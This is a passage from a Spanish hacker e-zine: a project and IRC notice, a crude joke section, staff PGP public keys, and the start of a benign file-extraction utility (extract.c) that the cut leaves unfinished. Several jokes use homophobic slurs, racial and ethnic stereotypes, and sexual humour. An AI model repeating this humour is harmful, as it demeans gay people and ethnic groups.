 Este  es  un nuevo  proyecto de 0ri0n (la cual esta en fase beta), lo que
 quereremos con esto es depositar en nuestra web con toda la documentacion
 referente a Sistema Operativos, Redes, Lenguajes de Programacion, Etc. Si
 tienes  un  buen texto, puedes enviarlo  a  documentos@0ri0n.org  (con su
 respectivo Copyright, Nombre del Autor, Direccion de Correo Electronico),
 la documentacion ya depositada la puedes ver en:

 http://pleyades.sourceforge.net/docs.php


 -=[ Canal en el IRC.]=-

 Este es un peque~o proyecto (mas que un proyecto es una  via  de descanso
 para todo el staff de 0ri0n), fue el de fundar un canal de  charlas en el
 IRC (irc.dal.net:7000), es el de #otv , aqui nos reunimos  todos los  del
 staff (y algunos amigos) para discutir  diferentes  temas  (H/C/P/V/Etc);
 Pero como todo no es color rosa tambien fundamos un canal para proporcionar
 ayuda con linux, que es el de  #linuxayuda , alli  puedes conseguir ayuda
 con todo lo referente a al maravilloso Sistema  Operativo Linux,  tambien
 hay uno muy bueno que es el de #linuxlatino, simplemente lo invitamos para
 que compartas un rato agreadable con nosostros.



--EOF--


-[ 2x14 ]--------------------------------------------------------------------
-[ Seccion Anti-Stress ]-------------------------------------[ 0ri0n Staff ]-
---------------------------------------------------------[ staff@0ri0n.org ]-


   -=[ Todo sobre las Madres ...]=-

  "Todo lo que siempre necesite saber, lo aprendi de mi Madre..."

  Mi madre me ense~o a APRECIAR UN TRABAJO BIEN HECHO:
  "Si se van a matar, haganlo afuera. Acabo de terminar de limpiar!"

  Mi madre me ense~o RELIGION:
  "Mejor reza para que esta mancha salga de la alfombra."

  Mi madre me ense~o LOGICA:
  "Porque yo lo digo, por eso... y punto!!!!"

  Mi madre me ense~o PREDICCIONES:
  "Asegurate que estas usando ropa interior limpia y entera, en caso que
   tengas un accidente."

  Mi madre me ense~o IRONIA:
  "Sigue llorando y yo te voy a dar una razon verdadera para que llores."

  Mi madre me ense~o a ser AHORRATIVO:
  "Guarda las lagrimas para cuando yo muera"

  Mi madre me ense~o OSMOSIS:
  "Cierra la boca y come"

  Mi madre me ense~o CONTORSIONISMO:
  "Mira la suciedad que tienes en la nuca, vuelvete a ba~ar"

  Mi madre me ense~o FUERZA Y VOLUNTAD:
  "Te vas a quedar sentado hasta que te comas todo."

  Mi madre me ense~o METEOROLOGIA:
  "Parece que un huracan paso por tu cuarto."

  Mi madre me ense~o HIPOCRESIA:
  "Te he dicho un millon de veces que no seas exagerado!"

  Mi madre me ense~o EL CICLO DE LA VIDA:
  "Te traje a este mundo, y te puedo sacar de el."

  Mi madre me ense~o MODIFICACION DE PATRONES DEL COMPORTAMIENTO:
  "Deja de actuar como tu padre"

  Mi madre me ense~o ENVIDIA:
  "Hay millones de chicos menos afortunados en este mundo que no tienen una
   mama tan maravillosa como la tuya!"

  Mi madre me ense~o habilidades como VENTRILOQUIA:
  "No me rezongues, callate y contestame: porque lo hiciste?"

  Mi madre me ense~o tecnicas de ODONTOLOGIA:
  "Me vuelves a contestar y te estampo los dientes en la pared"

  Mi madre me ense~o RECTITUD:
  "Te voy a enderezar de un solo le~azo".

  GRACIAS MAMA....



  -=[ Armando y Maria ]=-


  Armando  y  Maria daban  un  paseo  romantico por  el  campo. Los deseos
  amorosos  de  Armando  aumentaban  conforme  se   internaban  entre  los 
  arboles. Justo  cuando  su  lujuria  llegaba  al maximo y el comenzaba a
  arrimarse a Maria, ella lo interrumpe:

  "Espero no te moleste, pero tengo ganas echarme una meadita".

  Un poco surprendido por la vulgaridad, le dice:

  "Esta bien, por que no te vas detras de estos arbustos?".

  Ella  se  desaparece  detras  de  la   maleza. Mientras  Armando  espera,
  puede escuchar el sonido de los calzoncitos de nylon deslizandose por las
  suculentas  piernas de Maria y se imagina todo aquello que esta  quedando
  expuesto. Incapaz  de  contener  un  segundo  mas sus instintos animales,
  Armando introduce  el  brazo a traves de los arbustos y toca la pierna de
  Maria. Suavemente sube la mano mas y mas, hasta  que, horrorizado, agarra
  algo largo y grueso que cuelga entre las piernas de Maria.

  "Maria, por Dios! Te cambiaste de sexo?", grita el angustiado.

  "No", contesta ella, "cambie de opinion......... Estoy cagando".


 
  -=[ La Gallinita ]=-  


  Una vez se reunieron un elefante, una jirafa y una gallina para hablar con
  Dios. Llega el elefante y le dice:

  - Se~or, ya estoy cansado de tener esta trompa tan larga
  - Todos los demas animales se burlan de mi.

  - Dios le responde:
  - Hijo mio, debes estar agradecido con la trompa que  te  he  dado, porque
    con ella puedes recoger bastante agua para beber.
  - Convence al elefante y este se va contento.

  - Llega la jirafa y le dice:
  - Se~or, ya estoy cansada de tener este cuello tan largo. Todos los demas
    animales se burlan de mi.
  - Dios le responde:
  - Hija mia, debes estar agradecida con el cuello que te  he  dado, porque
    con el puedes ver mas alla de las monta~as,  recoger  los  frutos altos
    de los arboles y prevenirte a lo lejos de tus enemigos naturales.
  - Convence asi a la jirafa y esta se va contenta.

  - Llega entonces la gallina donde esta Dios y le dice:
  - A mi  si  que  no  me  vengas con mariqueras. O me agrandas el culo o me
    achicas los huevos!!!

 


  -=[ Diferencias entre un amigo y un VERDADERO amigo ]=-


  Un AMIGO: Te manda e-mails que te hacen reflexionar y meditar.
  Un VERDADERO AMIGO: Te  manda  e-mails con estupideses y asquerosidades.

  Un AMIGO: Piensa que los problemas  por  los  que te quejas son recientes.
  Un VERDADERO AMIGO: Te dice: "Deja  de  quejarte de las  mismas  tonterias 
  siempre y solucionalo, que ya me tenes harto!".

  Un AMIGO: Nunca te vio Llorar.
  Un VERDADERO AMIGO: Ya tiene los hombros mojados de verte llorar y ya sabe
  que eres un Maricon.

  Un AMIGO: Desconoce el nombre de tus padres.
  Un VERDADERO AMIGO: Tiene siempre el telefono de tus viejos encima por  si
  te llevan preso.

  Un AMIGO: Lleva una botella de vino a tu casa cuando hay fiesta.
  Un VERDADERO AMIGO: Llega a tu casa completamente loco de la pea, se toma 
  todo lo que  encuentra en su camino, se caga de risa de tus invitados y te 
  hace quedar como el propio estupido.

  Un AMIGO: Odia  que  lo llames despues que se  acosto  a  dormir, pero  te
  atiende igual.
  Un VERDADERO AMIGO: Directamente ni te atiende.

  Un AMIGO: Busca hablar de tus problemas.
  Un VERDADERO AMIGO: Te los intenta solucionar con unas cuantas botellas de
  cerveza de por medio.

  Un AMIGO: Actua como invitado en tu casa.
  Un VERDADERO AMIGO: Entra a tu casa abre la nevera, te come todo lo que el
  ve, te ensucia el ba~o y se sienta a ver lo que el quiera en la television.

  Un AMIGO: Piensa que se acaba la amistad si hay una discucion.
  Un VERDADERO AMIGO: Se cansa y te  cae a golpes y al otro dia ni se acuerda
  de que paso, pero esta todo bien.

  Un AMIGO: Espera que estes siempre a su lado.
  Un VERDADERO AMIGO: Espera siempre estar a tu lado.

  Un AMIGO: Nunca te putea.
  Un VERDADERO AMIGO: ya vocalizo hacia ti todas  las barbaridades  habidas y
  por haber.

  Un AMIGO: Te cuida toda la noche si estas muy borracho.
  Un VERDADERO AMIGO: Te tira  en unos matorrales para que no te lleven preso
  y a las 8am te pasa a buscar para llevarte a tu casa.

  Un AMIGO: Si te quieren pegar intenta arreglarlo con explicaciones.
  Un VERDADERO AMIGO: Se rie y te rega~a porque no saltaste a defenderlo.

  Un AMIGO: Nunca dice cosas que sabe que te molestan.
  Un VERDADERO AMIGO: Si  sabe que  te molesta  algo lo va a hacer  hasta  el
  cansancio.

  Entonces quien es tu AMIGO y quien es tu VERDADERO AMIGO?



  -=[ No se quien soy ]=-

  Se~or juez:
 
  No  culpe  a nadie de mi muerte. Me suicido porque si vivo dos dias mas
  no sabria quien soy.

  Vera usted. Tuve la desgracia de casarme con una viuda. Esta viuda tenia
  una hija casadera, y para mi perdicion mi padre se caso con ella.
 
  De modo que mi esposa paso a convertirse en suegra de su suegro, mi hija
  se convirtio en mi madre y al mismo tiempo mi padre era mi yerno.
 
  Poco despues mi madrastra trajo un ni~o al mundo, quien seria mi hermano.
  Pero a la vez era nieto de mi mujer, por lo que yo era el abuelo  de  mi
  propio hermano.
 
  Con el correr del tiempo mi mujer tuvo un hijo que, como era hermano  de
  mi madrastra, era cu~ado de mi padre y tio de su hijo. Mi mujer  por  lo
  tanto, era suegra de su propia hija.
 
  Yo, en cambio, soy padre de mi padre, y mi padre y su mujer son mis hijos.
  Como  ya soy el padre de mi padre, mi madre y mi hijo son hermanos, y  mi
  mujer es mi abuela, ya que es la madre de mi padre. Asi pues, que yo  soy
  mi abuelo.
 
  Ya ve se~or juez, me despido de este mundo porque no se ni quien soy!!
 
  Firmado: Mi abuelo


  -= [ Infidelidad ]=-
   
  EL  gallego  se acuesta  a  dormir pero nota algo raro y le pregunta a su 
  mujer: 
   
  - Josefa, Por que hay seis pies en nuestra cama? 
  - No hombre, que hay cuatro. 
  - Pero si yo veo seis. 
  - Hay cuatro. Bajate y cuentalos. 
  - Se baja de la cama el gallego y los cuenta: 
  - Uno... dos... tres... cuatro. Hay si, tenias razon! 
 


  -= [ Profesor ]=-
 
  Un profesor de primer a~o de Medicina esta dando a sus alumnos la primera 
  leccion sobre autopsias en la morgue y les dice:

  Para  hacer  una autopsia hay dos elementos basicos; el primero no  tener 
  ninguna repugnancia. En ese momento el profesor introduce un dedo  en  el 
  ano  del  muerto  y luego lo chupa, A continuacion pide a los estudiantes
  que hagan lo  mismo luego  de  un  rato  de silencio temeroso comienzan a
  obedecer. Al final el profesor  prosigue; el segundo elemento fundamental
  es un sentido  muy  agudo de la observacion; yo meti mi dedo anular, pero
  me chupe el indice.
    
   
  -= [ Clase de Medicina ]=-  

   En la clase de Medicina pregunta el profesor:

   - Quien puede decirme el organo del cuerpo que puede agrandarse 9 veces su
     propio tama~o.
   - Toda la clase se queda en silencio y  una  chica  muy  timida levanta la
     mano y dice:

     Profesor, ese organo es el pene !!

   - Y el profesor responde: mmm, No??, es la pupila;
     pero felicite a su novio de mi parte.
    


  -= [ Alumna ]=-

   Estaba el doctor dando la clase de Anatomia masculina y pregunta al azar: 

   - Cuantos mililitros salen en una eyaculacion?

   Los alumnos se quedan callados y despues de un  silencio sepulcral ... 
   dice una alumna;

   "500 mililitros Profesor"

   A lo que el profesor responde;

   - Dejeme decirle se~orita, pero creo que a usted la orinaron...


   -=[ El Negro y el Enano ]=-

   Un enorme negro entra a un ba~o publico. En el Orinario de al  lado se
   encuentra un enano que se le queda viendo y comienza a gui~arle el ojo
   varias veces. El negro, mosqueado, le reclama:

  "Aparte enano maricon" 

  "No, lo que pasa es que me estas salpicando, imbecil!"



   -=[ Misionero ]=-

  Un misionero, de servicio por el africa, iba ensimismado en sus rezos y
  oraciones, cuando, subitamente, se le aparece un leon tan grande como un
  toro abriendo su enorme hocico lleno de colmillos que parecia una cueva;
  el evangelizador, viendose perdido, junta las manos y reza al Altisimo:

  "Sr. Dios y su hijo Jesucristo, haced que este leon se haga cristiano!" 

  Subitamente, el leon se detiene y, haciendo un esfuerzo sobrenatural,
  logra doblar las patas traseras para ponerse de rodillas en el suelo;
  entonces, levantando su enorme cuerpo hacia arriba, junta las dos patas
  delanteras y con una voz todo gru~idos pide:

  "Se~or, bendice estos alimentos que vamos a comer..."



  -=[ La Azafata ]=-

  Despues de efectuado el despegue, el piloto  del  avion se dirige  a  los
  pasajeros por el altavoz:

  "Estimados pasajeros: Bienvenidos al vuelo 888 con destino a la ciudad de
   Paris, nuestro tiempo estimado de vuelo es de 14 horas con  50  minutos,
   les recordamos que este es un vuelo de no fumar, por favor mantengan sus
   cinturones abrochados... etc."

  Al terminar el rollo de siempre, olvida apagar el microfono  y  empieza a
  decirle a su copiloto:

  "Ahora si, compadre, nada  mas  pongo  el  piloto  automatico, me echo un
   cigarrito, y luego me cojo a la azafata!"

  Al notar que todos los pasajeros escuchan el comentario,  la  azafata sale
  corriendo para avisarle al capitan que  apague  el  microfono, cuando  una
  anciana sentada junto al pasillo le pone  tremendo bastonazo y la tumba al
  suelo. La aeromoza, desconcertada,  voltea  a  ver a  la viejita, quien le
  advierte:

  "Quieta, Mujer! Primero dejalo que se eche el cigarrito".


  -THE END-



-[ 2x15 ]--------------------------------------------------------------------
-[ Llaves PGP ]----------------------------------------------[ 0ri0n Staff ]-
---------------------------------------------------------[ staff@0ri0n.org ]-

0ri0n Staff
-----------

[++] KeysPGP/staff.asc $c6b847c60519fbe7a4f8b06e8819e4be
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>
Comment: 0ri0n Staff <staff@0ri0n.org>

mQENAzqIt4sAAAEIALj4jst/s88U0syp5L4L8JVQ3+1oKiw9donngRne3W31zZjc
Th+HWOUdi+6EkQRRDzEcAvcnUrajS5+4J0up0eZ6k/8TXUVJvxsiKCdsJkbMfoCn
uDMUs5X1WlNBKwEFgkMl2YtVeZzewSNDNLFPQ4OUOvXSFEmn+eJ2q8eNnuGR8dkd
HwetXSMy4roabT6kfJl0ygC3nHnrKzC+1eLtIMY90UVMdVYkW+T/IKhXIzEW0daP
FKru7UiViMmAoL96o4vio5wBIiLFbkGTzIHSqHTR+pt1xBMkk3NfSp9EFhXF/D6a
aOo1g0zBsnM6GC23E8zO2gf0XDfSyqMJV8h9tA8ABRG0HTByaTBuIFN0YWZmIDxz
dGFmZkAwcmkwbi5vcmc+iQEVAwUQOoi3i8qjCVfIfbQPAQHm4gf9GksUyZroTb+A
/edb09tmSV0cwiDjIIDQTUIWlB3qV1Xby17prHWMSsHrKqoPni13X/gWly3BCXgM
6Zk3olVL9UG3N5B3OId0ltUa3GNPOR1wHF75EIEYuLSFIb0uZjwGwpZkbMEYNprF
5TRcIQWJ3pmMSj+cMM/TA9t0Rg9d0B7htLLQ2Oj4BDRfw1Bz4HQ100aChscBDEeE
S2iFEw0sVclLq50wW8z9cSW1jdKFd8aKmVCeYZbsou1koramZqXqpG1I6FQ8zVBB
bV6wiT2a/u35BluxGGIrNYsHzN3sAdLx5CoFdpEvP2uj4T9GPla3fy/4XYMCkNoQ
6GacU61uZw==
=tvpq
-----END PGP PUBLIC KEY BLOCK-----
[--]


ShAd0w5
-------

[++] KeysPGP/shadow5.asc $2e398f59919a1e3195db3676d831132d
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>
Comment: ShAd0w5 <shadow5@0ri0n.org>

mQENAzqTwU4AAAEIAMVl5jLEcuNy0dAVCbz24jxtA2+FJkFIAR6yLd1gDeOxcQtC
L4rhcbAzl6YEplZXUAF9jtbPdjr1y9otgQ1gT4+GW8+uELk9ip9yd5dyFCPGP85w
L5zhC9AVoPvblueh1nRypz2HP3WDeVFihYvr9nkK20aIPyX03QG3NXLBpFVY5/IA
jnuDjAzbxbY0E4lr21Jhlg0w1qabCvlS62IWzcg42RwHklXOuo3PRQCao5u+xInY
6NKXGb3JQLBjtHKBpRay1b7flwLjf7dxfUJGVTfdLz3kh9209fwHdcvpXejXcPGF
sn5VOOkbKyMeIbqUNo8bm5LQQXDU8wZGsy7gdIMABRG0G1NoQWQwdzUgPHNoYWRv
dzVAMHJpMG4ub3JnPokBFQMFEDqTwU7zBkazLuB0gwEB3J4H/2rMrbA1fTRzLfWQ
BAvZdAuHBBheahkJ6tNJUS604WdvCFQtwrcLNKIpAStq4kBnKQ/yqx9a6fUzp0qm
qZ4a+Wmj7hjjo4liuoevOSYXI2ZRPQAyV72G8Xve5X2WbziMobJKguzO0lpmo8rx
D5DFJbf+G8uK1LhAxuvtYayc2C7C/U74d1I2gymf1Qgu2F+/FH6AVvkWdxrzAm+f
cBT5DsBWWrEU7zVaGdQxyheqBpUG84nGqZGsMkbMtHZuriXrJ2JledOvf6+YN87G
8fwjJoVPM7C7KBWxziv8v6TEevg0QkaQNHJwEtKOH+ks4fEjzpI6YIx8LEfpiMDD
FyvG254=
=6idm
-----END PGP PUBLIC KEY BLOCK-----
[--]


Mr. kl0nk Manson
----------------

[++] KeysPGP/kl0nk.asc $603e7cd07569ef824c6240c0af8fa686
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>
Comment: Mr. kl0nk Manson <kl0nk@0ri0n.org>

mQENAzqIts0AAAEIAN97iQsUCeNfle3fc59k0d+PSskIcO4IsA6IhvM7rTuuw0YD
l01BAz8ECt9C7zYX22cbBwsRO5hhU338/Jw1G7Cea7i8mjSH8U0CHz0fvcHYUUjU
vyikaqiRPpNHrmeYZaZU2FTJLZ9G+hcXQcWzH0XFI9Fv4F/SJJwelOzmIIYNDAIP
S5ydNMhE2IJl/PGszcl7I1DJvMCMkYVMfV4UOFgYPvPwh8hBteOlTwYVt8kVIU3x
eJ4aSPkjJ70u8hWTl8K3vvvu3yT48gKapLlq75siuwO08juXjrpY1NIEyXE+oTfm
nlAXqEKE9MdiWaw/NFVdPTR6gpPfHrJKkJxvPtkABRG0Ik1yLiBrbDBuayBNYW5z
b24gPGtsMG5rQDByaTBuLm9yZz6JARUDBRA6iLbNHrJKkJxvPtkBAVKXCACtJzTh
uF0SeMHohO3pWTN5TCsl0Eoc8Uz91aySe60KjIQOU4bnflOgzxtCNr8k/K8WO3jG
M4jeqJ8UTnA24L4SthaMUSVrJ7xJ7e0Jv9fgnadPcIgVbT+/W67TBylJpUyggAS3
XcI1gEO9AzjmzynmZu4P66c4w9Lz2PecikR+9/HwdG+bUMUlZXx8nnvrer4pH5kk
Vs5DwOcA9rjzTeOg2UwEhRT4nb3pZrb/iYpp6MnDOdm8/eztZzuxMWlcnKaf9UTP
CCqWCtcfLs0uisVnhCDHLOMYqeDCWqnpGlOLBJVmbzO+R+upKWGiQU67hfsK5hWi
dAOjFWPA2RUy7/vx
=QF9f
-----END PGP PUBLIC KEY BLOCK-----
[--]


-EOF-



-[ 2x16 ]--------------------------------------------------------------------
-[ Extract ]-------------------------------------------------[ 0ri0n Staff ]-
---------------------------------------------------------[ staff@0ri0n.org ]-
 
 Con este programa puedes extraer tanto las fuentes dentro de los articulo, 
 como articulo por articulo; este archivo fue originalmente escrito  por el 
 staff  de  Phrack  y el que usamos ahora fue modificado por  la  gente  de
 NetSearch.
 
 Modos de Uso:
 
 1. Primero que todo ejecuta el archivo ./extract que trae esta revista, si
    no funciona entonces compila el fuente que esta mas abajo.
 2. Para extraer todo el codigo que esta dentro de esta revista haz:
 
    ./extract *

 3. Para Separar los articulos haz:
 
    ./extract -s 0ri0n-2.txt
    

  Aqui esta el fuente de extract.

[++] extract.c $83f7215c6556ea49a8ecc27031dfab58
/*
 *  Original: Phrack Staff (r)
 *  Re-programacion: NetSearch - http://www.netsearch-ezine.com
 *
 *  El programa extrae archivos incluidos (codigos fuente y demas) incluidos
 *  dentro del e-zine. 
 *
 *  Con el modificador [-s] se separaran los articulos del e-zine en archivos
 *  separados numerados.
 *
 *  Compilacion: 
 *  gcc extract.c -o extract
 *
 *  ./extract [-s] archivo1 archivo2 archivo3  ...
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>
#include <dirent.h>

#define BEGIN_TAG   "[++] "
#define END_TAG     "[--]"
#define BT_SIZE     strlen(BEGIN_TAG)
#define ET_SIZE     strlen(END_TAG)
#define SPLIT_TAG  "-[ 2x"
#define SPLIT_SIZE strlen(SPLIT_TAG)

struct f_name
{
    unsigned char name[256];
    struct f_name *next;
};

#ifdef __alpha
typedef unsigned int uint32;
#else
typedef unsigned long uint32;
#endif

struct MD5Context
{
   uint32 buf[4];
   uint32 bits[2];
   unsigned char in[64];
};

void MD5Init(struct MD5Context *context);
void MD5Update(struct MD5Context *context, unsigned char const *buf,
               unsigned len);
void MD5Final(unsigned char digest[16], struct MD5Context *context);
void MD5Transform(uint32 buf[4], uint32 const in[16]);

typedef struct MD5Context MD5_CTX;

#ifndef HIGHFIRST
#define byteReverse(buf, len)
#else
void byteReverse(unsigned char *buf, unsigned longs);

#ifndef ASM_MD5
void byteReverse(unsigned char *buf, unsigned longs)
{
    uint32 t;
    do {
        t = (uint32) ((unsigned) buf[3] << 8 | buf[2]) << 16 |
            ((unsigned) buf[1] << 8 | buf[0]);
        *(uint32 *) buf = t;
        buf += 4;
    } while (--longs);
}
#endif
#endif

void MD5Init(struct MD5Context *ctx)
{
    ctx->buf[0] = 0x67452301;
    ctx->buf[1] = 0xefcdab89;
    ctx->buf[2] = 0x98badcfe;
    ctx->buf[3] = 0x10325476;

    ctx->bits[0] = 0;
    ctx->bits[1] = 0;
}

void MD5Update(struct MD5Context *ctx, unsigned char const *buf, unsigned len)
{
    uint32 t;

    t = ctx->bits[0];
    if ((ctx->bits[0] = t + ((uint32) len << 3)) < t)
        ctx->bits[1]++;
    ctx->bits[1] += len >> 29;

    t = (t >> 3) & 0x3f;


    if (t) {
        unsigned char *p = (unsigned char *) ctx->in + t;

        t = 64 - t;
        if (len < t) {
            memcpy(p, buf, len);
            return;
        }
        memcpy(p, buf, t);
        byteReverse(ctx->in, 16);
        MD5Transform(ctx->buf, (uint32 *) ctx->in);
        buf += t;
        len -= t;
    }

    while (len >= 64) {
        memcpy(ctx->in, buf, 64);
        byteReverse(ctx->in, 16);
        MD5Transform(ctx->buf, (uint32 *) ctx->in);
        buf += 64;
        len -= 64;
    }

    memcpy(ctx->in, buf, len);
}

void MD5Final(unsigned char digest[16], struct MD5Context *ctx)
{
    unsigned count;
    unsigned char *p;

    count = (ctx->bits[0] >> 3) & 0x3F;

    p = ctx->in + count;
    *p++ = 0x80;

    count = 64 - 1 - count;

    if (count < 8) {

        memset(p, 0, count);
        byteReverse(ctx->in, 16);
        MD5Transform(ctx->buf, (uint32 *) ctx->in);

        memset(ctx->in, 0, 56);
    } else {
        memset(p, 0, count - 8);
    }
    byteReverse(ctx->in, 14);

    ((uint32 *) ctx->in)[14] = ctx->bits[0];
    ((uint32 *) ctx->in)[15] = ctx->bits[1];

    MD5Transform(ctx->buf, (uint32 *) ctx->in);
    byteReverse((unsigned char *) ctx->buf, 4);
    memcpy(digest, ctx->buf, 16);
    memset(ctx, 0, sizeof(ctx));
}

#ifndef ASM_MD5

#define F1(x, y, z) (z ^ (x & (y ^ z)))
#define F2(x, y, z) F1(z, x, y)
#define F3(x, y, z) (x ^ y ^ z)
#define F4(x, y, z) (y ^ (x | ~z))

#define MD5STEP(f, w, x, y, z, data, s) ( w += f(x, y, z) + data,  w = w<<s | w>>(32-s),  w += x )

void MD5Transform(uint32 buffer[4], uint32 const in[16])
{
    register uint32 a, b, c, d;

    a = buffer[0];
    b = buffer[1];
    c = buffer[2];
    d = buffer[3];

    MD5STEP(F1, a, b, c, d, in[0] + 0xd76aa478, 7);
    MD5STEP(F1, d, a, b, c, in[1] + 0xe8c7b756, 12);
    MD5STEP(F1, c, d, a, b, in[2] + 0x242070db, 17);
    MD5STEP(F1, b, c, d, a, in[3] + 0xc1bdceee, 22);
    MD5STEP(F1, a, b, c, d, in[4] + 0xf57c0faf, 7);
    MD5STEP(F1, d, a, b, c, in[5] + 0x4787c62a, 12);
    MD5STEP(F1, c, d, a, b, in[6] + 0xa8304613, 17);
    MD5STEP(F1, b, c, d, a, in[7] + 0xfd469501, 22);
    MD5STEP(F1, a, b, c, d, in[8] + 0x698098d8, 7);
    MD5STEP(F1, d, a, b, c, in[9] + 0x8b44f7af, 12);
    MD5STEP(F1, c, d, a, b, in[10] + 0xffff5bb1, 17);
    MD5STEP(F1, b, c, d, a, in[11] + 0x895cd7be, 22);
    MD5STEP(F1, a, b, c, d, in[12] + 0x6b901122, 7);
    MD5STEP(F1, d, a, b, c, in[13] + 0xfd987193, 12);
    MD5STEP(F1, c, d, a, b, in[14] + 0xa679438e, 17);
    MD5STEP(F1, b, c, d, a, in[15] + 0x49b40821, 22);

    MD5STEP(F2, a, b, c, d, in[1] + 0xf61e2562, 5);
    MD5STEP(F2, d, a, b, c, in[6] + 0xc040b340, 9);
    MD5STEP(F2, c, d, a, b, in[11] + 0x265e5a51, 14);
    MD5STEP(F2, b, c, d, a, in[0] + 0xe9b6c7aa, 20);
    MD5STEP(F2, a, b, c, d, in[5] + 0xd62f105d, 5);
    MD5STEP(F2, d, a, b, c, in[10] + 0x02441453, 9);
    MD5STEP(F2, c, d, a, b, in[15] + 0xd8a1e681, 14);
    MD5STEP(F2, b, c, d, a, in[4] + 0xe7d3fbc8, 20);
    MD5STEP(F2, a, b, c, d, in[9] + 0x21e1cde6, 5);
    MD5STEP(F2, d, a, b, c, in[14] + 0xc33707d6, 9);
    MD5STEP(F2, c, d, a, b, in[3] + 0xf4d50d87, 14);
    MD5STEP(F2, b, c, d, a, in[8] + 0x455a14ed, 20);
    MD5STEP(F2, a, b, c, d, in[13] + 0xa9e3e905, 5);
    MD5STEP(F2, d, a, b, c, in[2] + 0xfcefa3f8, 9);
    MD5STEP(F2, c, d, a, b, in[7] + 0x676f02d9, 14);
    MD5STEP(F2, b, c, d, a, in[12] + 0x8d2a4c8a, 20);

    MD5STEP(F3, a, b, c, d, in[5] + 0xfffa3942, 4);
    MD5STEP(F3, d, a, b, c, in[8] + 0x8771f681, 11);
    MD5STEP(F3, c, d, a, b, in[11] + 0x6d9d6122, 16);
    MD5STEP(F3, b, c, d, a, in[14] + 0xfde5380c, 23);
    MD5STEP(F3, a, b, c, d, in[1] + 0xa4beea44, 4);
    MD5STEP(F3, d, a, b, c, in[4] + 0x4bdecfa9, 11);
    MD5STEP(F3, c, d, a, b, in[7] + 0xf6bb4b60, 16);
    MD5STEP(F3, b, c, d, a, in[10] + 0xbebfbc70, 23);
    MD5STEP(F3, a, b, c, d, in[13] + 0x289b7ec6, 4);
    MD5STEP(F3, d, a, b, c, in[0] + 0xeaa127fa, 11);
    MD5STEP(F3, c, d, a, b, in[3] + 0xd4ef3085, 16);
    MD5STEP(F3, b, c, d, a, in[6] + 0x04881d05, 23);
    MD5STEP(F3, a, b, c, d, in[9] + 0xd9d4d039, 4);
    MD5STEP(F3, d, a, b, c, in[12] + 0xe6db99e5, 11);
    MD5STEP(F3, c, d, a, b, in[15] + 0x1fa27cf8, 16);
    MD5STEP(F3, b, c, d, a, in[2] + 0xc4ac5665, 23);

    MD5STEP(F4, a, b, c, d, in[0] + 0xf4292244, 6);
    MD5STEP(F4, d, a, b, c, in[7] + 0x432aff97, 10);
    MD5STEP(F4, c, d, a, b, in[14] + 0xab9423a7, 15);
    MD5STEP(F4, b, c, d, a, in[5] + 0xfc93a039, 21);
    MD5STEP(F4, a, b, c, d, in[12] + 0x655b59c3, 6);
    MD5STEP(F4, d, a, b, c, in[3] + 0x8f0ccc92, 10);
    MD5STEP(F4, c, d, a, b, in[10] + 0xffeff47d, 15);
    MD5STEP(F4, b, c, d, a, in[1] + 0x85845dd1, 21);
    MD5STEP(F4, a, b, c, d, in[8] + 0x6fa87e4f, 6);
    MD5STEP(F4, d, a, b, c, in[15] + 0xfe2ce6e0, 10);
    MD5STEP(F4, c, d, a, b, in[6] + 0xa3014314, 15);
    MD5STEP(F4, b, c, d, a, in[13] + 0x4e0811a1, 21);
    MD5STEP(F4, a, b, c, d, in[4] + 0xf7537e82, 6);
    MD5STEP(F4, d, a, b, c, in[11] + 0xbd3af235, 10);
    MD5STEP(F4, c, d, a, b, in[2] + 0x2ad7d2bb, 15);
    MD5STEP(F4, b, c, d, a, in[9] + 0xeb86d391, 21);

    buffer[0] += a;
    buffer[1] += b;
    buffer[2] += c;
    buffer[3] += d;
}

#endif

int hex_digit(int c)
{
        if (c >= '0' && c <= '9')
                return c - '0';
        if (c >= 'a' && c <= 'f')
           return c - 'a' + 10;
        return -1;
}

int mdfile(FILE *archivo, unsigned char *digest)
{
        unsigned char buffer[1024];
        MD5_CTX ctx;
        int n;


        fseek(archivo,0,SEEK_SET);
        MD5Init(&ctx);
        while ((n = fread(buffer, 1, sizeof(buffer), archivo)) > 0)
                MD5Update(&ctx, buffer, n);
        MD5Final(digest, &ctx);
        if (ferror(archivo))
                return -1;
        return 0;
}

unsigned long crcTable[256];

void crcgen()
{
  unsigned long crc, poly;
  int i, j;
  poly = 0xEDB88320L;
  for (i=0; i<256; i++) {
     crc = i;
     for (j=8; j>0; j--) {
       if (crc&1) {
           crc = (crc >> 1) ^ poly;
       }
       else {
           crc >>= 1;
       }
     }
     crcTable[i] = crc;
  }
}

unsigned long check_crc( FILE *fp )
{
   register unsigned long crc;
   int c;

   crc = 0xFFFFFFFF;
   while( (c=getc(fp)) != EOF ) {
         crc = ((crc>>8) & 0x00FFFFFF) ^ crcTable[ (crc^c) & 0xFF ];
   }

   fseek(fp,0,SEEK_SET);

   return( crc^0xFFFFFFFF );

}

void tmp_digest(unsigned char *p, unsigned char *digest_tmp)
{
        int i;

        for (i = 0; i < 16; ++i)
           sprintf(&digest_tmp[i*2],"%02x", *p++);
}

int main(int argc, char **argv)
{
    unsigned char b[256], *bp, *fn, *tmp;
    unsigned char digest_f[32];
    int i, i2=1, j = 0, h_c = 0, k,h_md5,d1=0,d2=0,modo_split=0;
    unsigned long crc=0, crc_f=0;
    unsigned char digest[16], digest_tmp[32];
    FILE *in_p, *out_p = NULL, *separado;
    struct f_name *fn_p = NULL, *head = NULL;

    if (argc < 2)
      {
        printf("Uso: %s [-s] archivo1 archivo2 ... archivo-n\n", argv[0]);
        exit(0);
      }

    if((argv[1][0] == '-')&&(argv[1][1]=='s')&&(strlen(argv[1])<3))
    {
      modo_split=1;
      i2=2;
    }       
        
    for (i = i2; (fn = argv[i++]); )
      {
        if (!head)
	  {
            if (!(head = (struct f_name *)malloc(sizeof(struct f_name))))
	      {
                perror("malloc");
                exit(1);
	      }
            strncpy(head->name, fn, sizeof(head->name));
            head->next = NULL;
            fn_p = head;
	  }

        else
	  {
            if (!(fn_p->next = (struct f_name *)malloc(sizeof(struct f_name))))
	      {
                perror("malloc");
                exit(1);
	      }
